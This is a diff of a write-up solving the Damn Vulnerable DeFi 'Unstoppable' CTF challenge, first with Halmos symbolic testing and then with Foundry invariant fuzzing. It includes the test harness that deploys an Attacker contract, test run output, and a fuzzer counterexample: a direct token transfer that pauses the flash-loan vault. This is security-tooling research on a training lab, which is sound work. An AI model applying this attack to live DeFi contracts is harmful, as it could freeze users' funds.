+This is an exact copy of SymbolicAttacker, except we've replaced the symbolic values with concrete values ​​from the counterexample.
 And test_unstoppable():
 ```javascript
-/**
-* CODE YOUR SOLUTION HERE
-*/
-function  test_unstoppable() public  checkSolvedByPlayer {
-	Attacker attacker =  new  Attacker();
-	token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
-	attacker.add_known_address(address(token));
-	attacker.add_known_address(address(vault));
-	attacker.add_known_address(address(monitorContract));
-	attacker.attack();
-}
+function test_unstoppable() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker();
+        token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
+        attacker.attack();
+    }
 ```
 Let's execute:
-```bash
+```javascript
 forge test -vv --mp test/unstoppable/Unstoppable.t.sol
 ...
 Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
 [PASS] test_assertInitialState() (gas: 57390)
-[PASS] test_unstoppable() (gas: 332461)
-Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.62ms (331.63µs CPU time)
-
-Ran 1 test suite in 7.44ms (2.62ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+[PASS] test_unstoppable() (gas: 899808)
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.56ms 
+Ran 1 test suite in 37.58ms (1.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests) 
 ```
 Success! The challenge "Unstoppable" is solved successfully using Halmos symbolic testing.
+
+## And what about fuzzing?
+At the time of writing, [Echidna-driven](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/hints/contracts/unstoppable/UnstoppableEchidna.sol) solution by Crytic team and [Foundry-driven](https://github.com/devdacian/solidity-fuzzing-comparison/blob/main/test/02-unstoppable/UnstoppableBasicFoundry.t.sol) solution by devdacian can be found on the Internet. However, these solutions were made for older versions of Unstoppable. The current version needs to check other invariants, so we will work with a modernized solution. Of course, I chose invariant-driven Foundry as my fuzzing engine since the current version of Damn-Vulnerable-Defi was completely rewritten on Foundry. 
+### Invariant
+The invariant is obvious - I just took the code of the **_isSolved()** function from **Unstoppable_Halmos.t.sol** and used it:
+```javascript
+function invariant_check_flash_loan() public {
+    vm.prank(deployer);
+    monitorContract.checkFlashLoan(100e18);
+    // Foundry should generate counterexample here.
+    // We expect it to find such a contract and data that sets the vault paused.
+    assert(vault.paused() == false || vault.owner() != deployer);
+}
+```
+### SetUp()
+And the **SetUp()** was changed somewhat, where it was indicated that the attacking actor is only the player, and fuzzing is performed on all known contracts:
+```javascript
+function setUp() public {
+...
+    vm.stopPrank();
+    targetSender(player);
+    targetContract(address(token));
+    targetContract(address(vault));
+    targetContract(address(monitorContract));
+}
+```
+### Fuzzing result
+Let's launch our Unstoppable, changed to fuzzing:
+```javascript
+~$ forge test -vvv --mp test/unstoppable/Unstoppable_Fuzz.t.sol
+...
+[FAIL: invariant_check_flash_loan replay failure]
+[Sequence]
+sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transfer(address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 1725540768 [1.725e9]]
+...
+```
+This method also quickly and simply found the attacking transaction.
 ## Conclusions
-1. Yes, we have proved that Halmos is ABLE to find solution for such CTF challenges
-2.  I don't know where that number of false-negative counterexamples came from. This is a big problem and this question should be answered in future
-3. I don't know why some random read of public variable from "vault" contract fixed counterexamples. It looks like a bug and this question should be answered as well
-4. Counterexamples analysis may be tricky because of hard-coded addresses and parameters. We can't just put counterexample in initial code and expect it will behave as expected
+1. We have proven that Halmos is capable of quite simply solving single-transaction CTF problems in a fairly intuitive way
+2. Counterexamples analysis may be tricky because of hard-coded addresses and parameters. We can't just put counterexample in initial code and expect it will behave as expected
+3. When we try to migrate a normal Foundry test to Halmos, we need to be careful not to use unsupported functionality from Foundry, or tricky cheat codes like makeAddr()
+4. Getting into recursion should be avoided as it can lead to garbage counterexamples or truncate code coverage
+5. In the case of fairly simple problems with a trivial solution, the solution through fuzzing looks and is much simpler: writing it took ten times less time and effort than solving through Halmos. However, **SPOILER ALERT**, Halmos will show his power in the following less trivial challenges
